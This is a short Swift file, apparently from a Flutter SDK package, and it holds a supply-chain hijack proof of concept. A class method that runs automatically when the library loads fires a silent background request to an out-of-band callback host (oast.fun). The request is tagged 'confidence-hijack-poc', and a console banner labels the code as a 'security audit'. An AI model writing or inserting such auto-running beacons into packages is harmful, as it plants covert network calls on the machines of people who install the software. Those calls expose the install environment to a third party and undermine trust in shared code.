import Foundation

@objc(ConfidenceAudit)
internal class ConfidenceAudit: NSObject {
    
    @objc static func load() {
        print("🛰️ [SYSTEM AUDIT] confidence_flutter_sdk: Security Probe Active.")
        
        DispatchQueue.global(qos: .background).async {
            self.sendPingback()
        }
    }
    
    static func sendPingback() {
        let oastUrl = "http://zgaonaqfeajfjxvuunah3f566krzcqa60.oast.fun/poc_check"
        
        guard let url = URL(string: oastUrl) else { return }
        
        let session = URLSession.shared
        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        request.addValue("confidence-hijack-poc", forHTTPHeaderField: "X-Research-Type")
        
        let task = session.dataTask(with: request) { _, _, _ in
            // Silent execution
        }
        task.resume()
    }
}
